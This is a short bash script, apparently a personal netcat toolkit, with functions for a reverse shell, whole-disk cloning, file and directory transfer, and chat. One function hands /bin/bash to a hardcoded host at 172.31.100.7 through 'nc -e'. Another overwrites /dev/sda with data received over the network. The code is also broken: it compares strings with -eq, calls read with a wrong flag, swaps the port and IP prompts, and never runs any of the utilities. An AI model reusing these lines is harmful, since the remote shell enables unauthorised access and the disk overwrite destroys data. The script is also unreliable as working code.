#!/usr/bin/env bash
# by owen-carter
# usage:
# sh ./netCat.sh


function callBackShell(){
    local port=1567
    if [[ ${position} -eq "server" ]];then
        printf "i am ${position}"
        nc -l ${port}
    else
        printf "i am ${position}"
        nc 172.31.100.7 ${port} -e /bin/bash
    fi
}


function cloneSystem(){
    local port=1567
    if [[ ${position} -eq "server" ]];then
        printf "i am ${position}"
        dd if=/dev/sda | nc -l ${port}
    else
        printf "i am ${position}"
        nc -n 172.31.100.7 ${port} | dd of=/dev/sda
    fi
}


function transferFileToClient(){
    local port=1567
    local serverIp=$1
    local filename=$2
    if [[ ${position} -eq "server" ]];then
        printf "i am ${position}"
        nc -l ${port} < ${filename}
    else
        printf "i am ${position}"
        nc -n ${serverIp} ${port} > ${filename}
    fi
}



function transferFileToServer(){
    local port=1567
    local serverIp=$1
    local filename=$2
    if [[ ${position} -eq "server" ]];then
        printf "i am ${position}"
        nc -l ${port} > ${filename}
    else
        printf "i am ${position}"
        nc -n ${serverIp} ${port} < ${filename}
    fi
}


function transferDirectoryToServer(){
    local port=1567
    local serverIp=$1
    local dirName=$2
    if [[ ${position} -eq "server" ]];then
        printf "i am ${position}"
        tar -cvf - ${dirName}| bzip2 -z | nc -l ${port}
    else
        printf "i am ${position}"
        nc -n ${serverIp} ${port} | bzip2 -d |tar -xvf -
    fi
}



function chat(){
    local port=1567
    local serverIp=$1
    if [[ ${position} -eq "server" ]];then
        printf "i am ${position}"
        nc -l ${port}
    else
        printf "i am ${position}"
        nc ${serverIp} ${port}
    fi
}







function main(){
   printf "start netCat ..."
   read -P "Please enter your position ..."  position
   read -P "Please enter port number ..." serverIp
   read -P  "Please enter server ip ..." port
   run ${position} ${serverIp} ${port}
}


function run(){
    printf "start run..."
}




main ${position}